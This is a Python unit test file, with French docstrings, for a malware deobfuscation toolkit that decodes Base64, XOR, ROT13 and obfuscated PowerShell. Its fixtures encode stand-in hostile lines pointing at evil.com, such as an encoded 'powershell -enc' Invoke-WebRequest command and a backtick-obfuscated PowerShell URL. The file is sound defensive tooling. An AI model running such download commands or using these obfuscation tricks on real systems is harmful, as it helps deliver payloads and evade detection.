"""
Module   : admap_m1.tests.unit.test_deobfuscators
"""
from __future__ import annotations

import base64

from admap_m1.deobfuscators.base64_decoder import Base64Decoder
from admap_m1.deobfuscators.powershell_decoder import PowerShellDecoder
from admap_m1.deobfuscators.rot_decoder import ROTDecoder
from admap_m1.deobfuscators.xor_decoder import XOR1ByteDecoder


def test_base64_decoder():
    """Test le décodage Base64."""
    decoder = Base64Decoder()
    
    # 1. Base64 pur
    plain = b"http://evil.com/payload.exe"
    b64_data = base64.b64encode(plain)
    
    results = decoder.decode(b64_data)
    assert len(results) > 0
    assert results[0].success is True
    assert plain in results[0].decoded_data
    
    # 2. Base64 UTF-16LE caché (PowerShell)
    ps_cmd = "Invoke-WebRequest http://evil.com/".encode("utf-16-le")
    ps_b64 = base64.b64encode(ps_cmd)
    payload = b"powershell -enc " + ps_b64 + b" and more"
    
    results2 = decoder.decode(payload)
    assert len(results2) > 0
    assert b"Invoke-WebRequest http://evil.com/" in results2[0].decoded_data


def test_xor_1byte_decoder():
    """Test le décodage XOR 1 octet."""
    decoder = XOR1ByteDecoder()
    
    plain = b"This is a hidden malicious url http://evil.com/payload.exe that we want to decode."
    key = 0x5A
    encoded = bytes(b ^ key for b in plain)
    
    results = decoder.decode(encoded)
    assert len(results) > 0
    
    # Doit avoir trouvé la bonne clé dans le top 3
    found = False
    for res in results:
        if res.metadata["key"] == hex(key):
            assert res.decoded_data == plain
            found = True
            break
            
    assert found is True


def test_rot_decoder():
    """Test le décodage ROT13."""
    decoder = ROTDecoder()
    
    # ROT13 de "http://evil.com"
    plain = "http://evil.com/download"
    encoded = "uggc://rivy.pbz/qbjaybnq".encode("utf-8")
    
    results = decoder.decode(encoded)
    assert len(results) > 0
    assert plain.encode("utf-8") in [r.decoded_data for r in results]


def test_powershell_decoder():
    """Test le nettoyage PowerShell."""
    decoder = PowerShellDecoder()
    
    # Backticks et concaténation (attention: ne pas mettre de backtick devant r, n, t)
    obfuscated = b"po`w`ershe`l`l -c 'h'+'t'+'t'+'p'+'://ev'+'il.com'"
    results = decoder.decode(obfuscated)
    
    assert len(results) == 1
    assert results[0].decoded_data == b"powershell -c 'http://evil.com'"
